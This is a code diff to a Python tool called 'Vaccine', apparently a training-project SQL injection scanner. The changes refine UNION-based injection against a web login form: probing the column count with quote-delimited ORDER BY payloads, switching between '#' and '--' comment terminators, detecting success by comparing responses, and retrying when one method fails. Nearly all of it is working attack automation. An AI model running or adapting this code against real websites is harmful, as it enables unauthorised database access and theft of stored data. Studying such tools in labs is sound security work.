@@ -58,24 +58,31 @@ class Union:
 	class UnionException(Exception):
 		pass
 
-	def __init__(self, submit):
+	def __init__(self, submit, comment):
+		print(f"{Style.GREEN}< UNION comment:{comment} >{Style.RESET}")
 		self.submit = submit
 		self.delimiter = "'"
 		self.header = self.delimiter + " UNION "
-		self.comment = "#"
+		self.comment = comment
 
 		self.original_text = self.submit("").text
 
 		self.column_counts = self.check_num_colums()
-
+		
 	def check_num_colums(self):
 		for i in range(1, 10):
 			q = f" ORDER BY {i}"
 			query = self.delimiter + q + self.comment
 			res = self.submit(query)
-			if not res.text.strip().startswith("<!DOCTYPE"):
-				break
+			#print(res.text)
+			result = get_diff(self.original_text, res.text)
+			if res.text and not result:
+				continue
+			#print("result", result)
+			break
 		column_counts = i - 1
+		if column_counts == 0:
+			raise self.UnionException("this method does not work")
 		print(f"column counts: {column_counts}")
 		return column_counts
 
@@ -192,7 +199,7 @@ class Vaccine:
 			error_exit(f"{self.url} - {response}")
 		return response.text
 
-	def submit(self, username, password=""):
+	def submit(self, username, password="password"):
 		if self.password_field_name:
 			payload = {
 				self.username_field_name: username,
@@ -203,6 +210,7 @@ class Vaccine:
 				self.username_field_name: username,
 				"Submit" : "Submit"
 			}
+		#print(f"payload {payload}")
 		res = requests.get(self.request_url, params=payload, cookies=cookies)
 		if self.method == "get":
 			res = requests.get(self.request_url, params=payload, cookies=cookies)
@@ -212,8 +220,20 @@ class Vaccine:
 
 	def vaccine(self):
 		self.submit("admin", "aaa")
-		u = Union(self.submit)
-		u.union()
+		try:
+			u = Union(self.submit, "#")
+			u.union()
+		except Union.UnionException as e:
+			error_continue(e)
+		except Exception as e:
+			error_exit(e)
+		try:
+			u2 = Union(self.submit, "--")
+			u2.union()
+		except Union.UnionException as e:
+			error_continue(e)
+		except Exception as e:
+			error_exit(e)
 
 def validate_args(args):
 	if not args.url.startswith('https://') and \
